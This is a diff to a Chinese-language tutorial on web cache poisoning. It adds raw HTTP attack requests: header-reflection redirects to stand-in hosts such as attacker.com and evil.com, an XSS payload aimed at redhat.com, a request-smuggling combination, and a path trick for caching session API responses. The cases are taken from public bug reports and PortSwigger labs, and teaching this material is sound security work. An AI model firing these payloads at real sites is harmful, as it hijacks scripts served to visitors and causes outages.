@@ -117,7 +117,105 @@
 
 ---
 
-# 0x03 攻击模式
+# 0x03 基础攻击向量
+
+## 3.1 **基础头部反射 (Header Reflection)**
+
+- **X-Forwarded-Host**: 用于模板化重定向或规范 URL。如 HackerOne 案例，通过该 Header 强制缓存存储指向恶意域名的 301 重定向。
+- **X-Forwarded-Scheme**: 干扰 HTTPS 强制跳转逻辑，造成重定向死循环或降级攻击。
+- **X-Host**：可能被用于加载某些静态资源，如 JS 资源
+
+**Header 字典**：[header.txt](./assets/header.txt)
+
+---
+
+### 3.1.1 基础攻击向量一：`X-Forwarded-Host`
+
+`X-Forwarded-Host` 触发 `301` 转跳，缓存服务器缓存 301 响应。对`/assets/main.js` 请求将会被替换攻击者控制的内容。
+
+```http
+GET /assets/main.js HTTP/1.1
+Host: target.com
+X-Forwarded-Host: attacker.com
+
+```
+
+---
+
+### 3.1.2 基础攻击向量二：`X-Forwarded-Host` + `X-Forwarded-Scheme`
+
+将 `X-Forwarded-Scheme` 设置为 `http`，由于服务器会将所有 `HTTP` 请求重定向到 HTTPS，在重定向时使用 `X-Forwarded-Host` 作为重定向的域名，缓存服务器缓存了指向恶意地址的 `301` 响应。
+
+```http
+GET /resources/js/tracking.js HTTP/1.1
+Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
+X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
+X-Forwarded-Scheme: http
+
+```
+
+### 3.1.2 基础攻击向量三：`X-Host` 
+
+**`X-Host`** 头可能被用作 **加载 JS 资源的域名**
+
+```http
+GET / HTTP/1.1
+Host: vulnerbale.net
+User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
+X-Host: attacker.com
+
+```
+
+
+
+### 3.1.3 案例一：HackOne host spoofing
+
+HackOne 后端使用 `X-Forwarded-Host`进行重定向和规范 URL，但缓存键仅使用了 `Host` 头，因此单个响应就毒害了所有访问 `/` 的访客。
+
+```http
+GET / HTTP/1.1
+Host: hackerone.com
+X-Forwarded-Host: evil.com
+
+```
+
+### 3.1.4 案例二：HackOne scheme spoofing
+
+HackOne 后端信任 `X-Forwarded-Scheme`来决定是否强制使用 HTTPS，设置`X-Forwarded-Scheme: http`，由于后端强制使用 HTTPS 的关系，可触发 301 转跳。
+
+```http
+GET /static/logo.png HTTP/1.1
+Host: hackerone.com
+X-Forwarded-Scheme: http
+
+```
+
+### 3.15. 案例三：Red Hat Open Graph meta poisoning
+
+1. Red Hat 的页面在生成 HTML 时，会为了 SEO 或社交分享的需求，动态构建 Open Graph 标记（例如 `<meta property="og:url" content="...">`）。
+2. 服务器后端错误地信任了 `X-Forwarded-Host` 头部。攻击者传入 `a."?><script>alert(1)</script>`，后端会未加过滤地将其拼接到 HTML 标签中。
+3. 缓存服务器缓存反射型 XSS 响应，从而变成存储型 XSS
+
+```http
+GET /en?dontpoisoneveryone=1 HTTP/1.1
+Host: www.redhat.com
+X-Forwarded-Host: a."?><script>alert(1)</script>
+
+```
+
+
+
+### 3.2 **内容处理滥用**
+
+- **Content-Type 注入**: 注入非法 Content-Type 触发后端 400 错误，若缓存未校验状态码，会导致页面全局 DoS（如 GitHub 案例）。
+- **Method Override**: 利用 `X-HTTP-Method-Override: HEAD` 诱导缓存存储 Content-Length 为 0 的空响应（如 GitLab 案例）。
+
+## 3.3 **底层解析差异**
+
+- **URL 规范化差异**: CDN 不解码 `%2F` 但后端解码，通过 `/share/%2F..%2Fapi/auth/session` 将敏感 API 响应诱骗至缓存目录（如 ChatGPT 案例）。
+- **大小写混淆**: Cloudflare 等 CDN 规范化 Host 为小写进行缓存，但转发至后端时保持原样，利用后端对 `Host: TaRgEt.CoM` 的特殊处理实现投毒。
+
+`X-Forwarded-Host`
 
 ---
 
@@ -127,11 +225,11 @@
 GET /assets/app.js HTTP/1.1
 Host: target.com
 X-Forwarded-Host: attacker.com
-X-Forwarded-Scheme: http  # 绕过HTTPS重定向
+X-Forwarded-Scheme: http  # 强制 HTTPS 重定向
 
 ```
 
-**原理**：服务器同时使用两个未键入头部生成重定向，缓存中毒后导致JS资源被劫持
+**原理**：将 `X-Forwarded-Scheme` 设置为 `http`，服务器将所有 `HTTP` 请求重定向到 HTTPS，在重定向时使用 `X-Forwarded-Host` 作为重定向的域名，控制该重定向指向的位置。缓存中毒后导致 JS 资源被劫持
 
 ---
 
@@ -143,7 +241,9 @@ Host: target.com
 
 ```
 
-**适用场景**：Ruby等支持`;`分隔参数的服务器，可将未键入参数隐藏在合法参数内
+**适用场景**：Ruby 等支持`;`分隔参数的服务器，可将非缓存键参数隐藏在合法参数内。
+
+Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)
 
 ## 3.4 Fat GET
 
@@ -158,6 +258,32 @@ report=innocent-victim  # 服务器使用此值，缓存使用URL中的值
 ```
 
 **原理**：服务器使用 Body 中的参数，但缓存系统仅依据 URL 缓存
+
+Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)
+
+---
+
+## 3.5 协同请求走私攻击
+
+```http
+POST / HTTP/1.1
+Host: vulnerable.net
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+GET /post/next?postId=3 HTTP/1.1
+Host: attacker.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1
+```
+
+**原理**：`/post/next?postId=3`会触发重定向，并使用 `Host: attacker.net` 作为重定向的目标。发送请求走私攻击后立刻访问某个静态资源，如：`/static/include.js`。随后，对 `/static/include.js` 的任何请求都会返回 `302` 重定向，获取缓存的攻击者脚本内容。
 
 ---
 
